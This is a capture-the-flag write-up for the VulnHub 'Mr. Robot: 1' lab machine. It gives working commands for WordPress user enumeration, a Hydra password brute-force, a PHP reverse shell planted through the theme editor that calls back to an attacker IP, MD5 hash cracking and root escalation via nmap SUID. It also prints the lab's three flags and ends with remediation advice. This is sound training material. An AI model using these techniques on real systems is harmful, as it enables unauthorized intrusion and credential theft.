# Mr. Robot: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Intermediate |
| **OS** | Linux (Ubuntu) |
| **Keys** | 3 flags (key-1-of-3.txt, key-2-of-3.txt, key-3-of-3.txt) |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/mr-robot-1,151/) |

## Attack Summary

Network scan → WordPress enumeration → download `fsocity.dic` wordlist from `robots.txt` → WPScan username enum (`elliot`) → Hydra brute-force → wp-admin → Theme Editor PHP reverse shell → `robot` user (crack MD5 hash) → nmap SUID interactive mode → root shell.

## Methodology

1. Network discovery and port scan
2. Web enumeration — discover WordPress and robots.txt
3. Download `fsocity.dic` wordlist and Key 1
4. Enumerate WordPress users with WPScan
5. Brute-force `elliot`'s password with Hydra
6. Upload PHP reverse shell via Theme Editor
7. Crack MD5 hash for `robot` user (Key 2)
8. Privilege escalation via nmap SUID (Key 3)

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- 192.168.56.X
```

Open ports: **80** (HTTP/WordPress), **443** (HTTPS/WordPress), **22** (SSH — closed).

---

## Step 2: Web Enumeration

Browse to `http://TARGET_IP` — interactive fake terminal themed around Mr. Robot.

Check `robots.txt`:

```
http://TARGET_IP/robots.txt
```

Output:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Key 1 captured:**

```bash
curl http://TARGET_IP/key-1-of-3.txt
# 073403c8a58a1f80d943455fb30724b9
```

---

## Step 3: Download and Deduplicate Wordlist

```bash
wget http://TARGET_IP/fsocity.dic
wc -l fsocity.dic
# 858160 entries — many duplicates

sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic
# 11451 unique entries
```

---

## Step 4: Enumerate WordPress Users

```bash
wpscan --url http://TARGET_IP --enumerate u
```

Found user: **elliot**

---

## Step 5: Brute-Force WordPress Login

```bash
hydra -l elliot -P fsocity_uniq.dic TARGET_IP http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" -t 30 -v
```

Credential found: **elliot : ER28-0652**

---

## Step 6: PHP Reverse Shell via Theme Editor

Log in to `http://TARGET_IP/wp-admin` as `elliot:ER28-0652`.

Navigate to: **Appearance → Editor → 404.php**

Replace contents with PentestMonkey's PHP reverse shell, set `$ip` and `$port`:

```php
$ip = '192.168.56.1';  // attacker IP
$port = 4444;
```

Start listener and trigger the shell:

```bash
nc -lvnp 4444
```

```bash
curl http://TARGET_IP/wp-content/themes/twentyfifteen/404.php
```

Reverse shell received as `daemon`.

---

## Step 7: Key 2 — Crack robot's MD5 Hash

```bash
ls /home/robot/
# key-2-of-3.txt  password.raw-md5

cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack with hashcat or john:

```bash
hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt
# abcdefghijklmnopqrstuvwxyz
```

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
su robot
# Password: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
# 822c73956184f694993bebb3eb32f0b9
```

---

## Step 8: Privilege Escalation — nmap SUID

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/nmap has SUID bit set
```

nmap version 3.81 supports `--interactive` mode:

```bash
nmap --interactive
nmap> !sh
# whoami → root

cat /root/key-3-of-3.txt
# 04787ddef27c3dee1ee161b21670b4e4
```

---

## Flags

| Key | Value |
|-----|-------|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `822c73956184f694993bebb3eb32f0b9` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |

---

## Lessons Learned

1. **robots.txt** can expose sensitive files — never list confidential paths
2. **Wordlist quality matters** — deduplicating cut brute-force time from days to minutes
3. **WordPress Theme Editor** allows arbitrary PHP execution when admin access is obtained
4. **Password reuse in MD5** — plain MD5 is not a password hash, use bcrypt/scrypt
5. **SUID on nmap (old versions)** — `--interactive` grants shell as owner (root)

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| robots.txt path disclosure | Remove sensitive paths; serve dummy file |
| Weak WordPress password | Enforce strong passwords, add 2FA |
| Theme Editor enabled | Disable file editing: `define('DISALLOW_FILE_EDIT', true)` in wp-config.php |
| MD5 password hashing | Use bcrypt (WordPress uses it natively) |
| nmap SUID | Remove SUID bit: `chmod u-s /usr/local/bin/nmap` |
